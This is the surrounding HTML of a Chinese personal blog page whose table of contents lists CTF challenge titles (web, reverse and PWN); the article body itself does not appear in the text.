"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-d6927j.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2025-04-06</div><div class="title">BUUCTF_WP</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#polarctf%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">polarctf靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">1.1.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95rce"><span class="toc-number">1.1.2.</span> <span class="toc-text">简单rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#swp"><span class="toc-number">1.1.3.</span> <span class="toc-text">swp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E9%BB%91%E6%8E%89%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">1.1.4.</span> <span class="toc-text">被黑掉的网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt"><span class="toc-number">1.1.5.</span> <span class="toc-text">jwt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.6.</span> <span class="toc-text">$$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.1.7.</span> <span class="toc-text">session文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E8%AF%95"><span class="toc-number">1.1.8.</span> <span class="toc-text">PHP反序列化初试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B2%E6%AD%A3%E5%88%99"><span class="toc-number">1.1.9.</span> <span class="toc-text">干正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#uploader"><span class="toc-number">1.1.10.</span> <span class="toc-text">uploader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debudao"><span class="toc-number">1.1.11.</span> <span class="toc-text">debudao</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rapyiquan"><span class="toc-number">1.1.12.</span> <span class="toc-text">rapyiquan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1ncIud3"><span class="toc-number">1.1.13.</span> <span class="toc-text">1ncIud3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%95%E5%96%82"><span class="toc-number">1.1.14.</span> <span class="toc-text">投喂</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8B%97%E9%BB%91%E5%AD%90%E7%9A%84RCE"><span class="toc-number">1.1.15.</span> <span class="toc-text">狗黑子的RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%95%E5%AD%97%E6%A3%8B"><span class="toc-number">1.1.16.</span> <span class="toc-text">井字棋</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BC%E8%88%AA%E7%AB%99"><span class="toc-number">1.1.17.</span> <span class="toc-text">简单的导航站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B0%E5%BA%95%E7%BB%99%E4%B8%8D%E7%BB%99flag%E5%91%A2"><span class="toc-number">1.1.18.</span> <span class="toc-text">到底给不给flag呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99shell"><span class="toc-number">1.1.19.</span> <span class="toc-text">写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.20.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E5%87%BD%E6%95%B0%E7%9A%84%E5%A4%8D%E4%BB%87"><span class="toc-number">1.1.21.</span> <span class="toc-text">某函数的复仇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BlackMagic"><span class="toc-number">1.1.22.</span> <span class="toc-text">BlackMagic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe"><span class="toc-number">1.1.23.</span> <span class="toc-text">xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E8%AF%BB%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">1.1.23.0.1.</span> <span class="toc-text">判读是否存在XXE漏洞：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">1.1.24.</span> <span class="toc-text">SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PlayGame"><span class="toc-number">1.1.25.</span> <span class="toc-text">PlayGame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpurl"><span class="toc-number">1.1.26.</span> <span class="toc-text">phpurl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%8D%E6%9D%A5ping%E4%B8%80%E6%B3%A2%E5%95%8A"><span class="toc-number">1.1.27.</span> <span class="toc-text">再来ping一波啊</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#search"><span class="toc-number">1.1.28.</span> <span class="toc-text">search</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.29.</span> <span class="toc-text">注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csdn"><span class="toc-number">1.1.30.</span> <span class="toc-text">csdn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unpickle"><span class="toc-number">1.1.31.</span> <span class="toc-text">unpickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wu"><span class="toc-number">1.1.32.</span> <span class="toc-text">wu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11"><span class="toc-number">1.1.33.</span> <span class="toc-text">代码审计1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9A%84%E9%A9%AC%E5%91%A2%EF%BC%9F"><span class="toc-number">1.1.34.</span> <span class="toc-text">你的马呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E5%80%BC"><span class="toc-number">1.1.35.</span> <span class="toc-text">随机值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-number">1.1.36.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file"><span class="toc-number">1.1.37.</span> <span class="toc-text">file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tnl"><span class="toc-number">1.1.38.</span> <span class="toc-text">tnl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%9F%A5%E9%81%93sys%E8%BF%98%E8%83%BD%E8%BF%99%E6%A0%B7%E7%8E%A9%E5%90%97"><span class="toc-number">1.1.39.</span> <span class="toc-text">你知道sys还能这样玩吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%91%E5%82%B2%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.40.</span> <span class="toc-text">笑傲上传</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE-%E9%80%86%E5%90%91"><span class="toc-number">1.2.</span> <span class="toc-text">REVERSE 逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%B7%E5%B8%88%E5%82%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">康师傅</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%8A%A0%E5%87%8F%E5%87%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">加加减减</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sandbox"><span class="toc-number">1.3.1.</span> <span class="toc-text">sandbox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#creeper"><span class="toc-number">1.3.2.</span> <span class="toc-text">creeper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.3.</span> <span class="toc-text">简单溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Emm"><span class="toc-number">1.3.4.</span> <span class="toc-text">Emm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Choice"><span class="toc-number">1.3.5.</span> <span class="toc-text">Choice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#overload1"><span class="toc-number">1.3.6.</span> <span class="toc-text">overload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x64"><span class="toc-number">1.3.7.</span> <span class="toc-text">x64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E6%98%AF%E5%A4%A7%E4%BD%AC%E8%BF%98%E6%98%AF%E8%8F%9C%E9%B8%A1"><span class="toc-number">1.3.8.</span> <span class="toc-text">你是大佬还是菜鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-ShellCode"><span class="toc-number">1.3.9.</span> <span class="toc-text">Easy_ShellCode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#play"><span class="toc-number">1.3.10.</span> <span class="toc-text">play</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/bb16f4e7.html" title="pwn笔记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-l8evjr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn笔记"/></a><div class="content"><a class="title" href="/posts/bb16f4e7.html" title="pwn笔记">pwn笔记</a><time datetime="2025-04-06T09:46:59.000Z" title="发表于 2025-04-06 17:46:59">2025-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/79666db.html" title="数据结构"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-kxmrq6.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据结构"/></a><div class="content"><a class="title" href="/posts/79666db.html" title="数据结构">数据结构</a><time datetime="2025-04-06T09:39:09.000Z" title="发表于 2025-04-06 17:39:09">2025-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d36bdd17.html" title="Web学习笔记"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-d6927j.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Web学习笔记"/></a><div class="content"><a class="title" href="/posts/d36bdd17.html" title="Web学习笔记">Web学习笔记</a><time datetime="2025-04-06T09:35:13.000Z" title="发表于 2025-04-06 17:35:13">2025-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/undefined.html" title="m1安装binutils"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-x6xygl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="m1安装binutils"/></a><div class="content"><a class="title" href="/posts/undefined.html" title="m1安装binutils">m1安装binutils</a><time datetime="2025-04-06T09:25:25.000Z" title="发表于 2025-04-06 17:25:25">2025-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ccc6fa83.html" title="BUUCTF_WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/wallhaven-d6927j.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF_WP"/></a><div class="content"><a class="title" href="/posts/ccc6fa83.html" title="BUUCTF_WP">BUUCTF_WP</a><time datetime="2025-04-06T06:04:36.000Z" title="发表于 2025-04-06 14:04:36">2025-04-06</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><div id="runtimeTextTip"></div></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2025 By <a class="footer-bar-link" href="/" title="guipi" target="_blank">guipi</a></div></div><div id="footer-type-tips"></div><div class="js-pjax"><script>function subtitleType () {
  fetch('https://v1.hitokoto.cn')
    .then(response => response.json())
    .then(data => {
      if (true) {
        const from = '出自 ' + data.from
        const sub = ["生活明朗&#44; 万物可爱&#44; 人间值得&#44; 未来可期."]
        sub.unshift(data.hitokoto, from)
        window.typed = new Typed('#footer-type-tips', {
          strings: sub,
          startDelay: 300,
          typeSpeed: 150,
          loop: true,
          backSpeed: 50,
        })
      } else {
        document.getElementById('footer-type-tips').innerHTML = data.hitokoto
      }
    })
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.cbd.int/typed.js@2.1.0/dist/typed.umd.js').then(subtitleType)
  }
} else {
  subtitleType()
}
</script></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">5</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://guipi01-github-io.vercel.app/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/1112.jpg" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://gcore.jsdelivr.net/gh/guipi01/images" title="guipi图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="guipi图床"/><span class="back-menu-item-text">guipi图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF/" style="font-size: 0.88rem;">CTF<sup>2</sup></a><a href="/tags/Mac-m1%E7%9A%84binutils%E9%85%8D%E7%BD%AE/" style="font-size: 0.88rem;">Mac m1的binutils配置<sup>1</sup></a><a href="/tags/PWN/" style="font-size: 0.88rem;">PWN<sup>1</sup></a><a href="/tags/Web/" style="font-size: 0.88rem;">Web<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 0.88rem;">数据结构<sup>1</sup></a></div></div><hr/></div></div><div id="keyboard-tips"><div class="keyboardTitle">博客快捷键</div><div class="keybordList"><div class="keybordItem"><div class="keyGroup"><div class="key">shift K</div></div><div class="keyContent"><div class="content">关闭快捷键功能</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift A</div></div><div class="keyContent"><div class="content">打开/关闭中控台</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift M</div></div><div class="keyContent"><div class="content">播放/暂停音乐</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift D</div></div><div class="keyContent"><div class="content">深色/浅色显示模式</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift S</div></div><div class="keyContent"><div class="content">站内搜索</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift R</div></div><div class="keyContent"><div class="content">随机访问</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift H</div></div><div class="keyContent"><div class="content">返回首页</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift F</div></div><div class="keyContent"><div class="content">友链鱼塘</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift L</div></div><div class="keyContent"><div class="content">友链页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift P</div></div><div class="keyContent"><div class="content">关于本站</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift I</div></div><div class="keyContent"><div class="content">原版/本站右键菜单</div></div></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
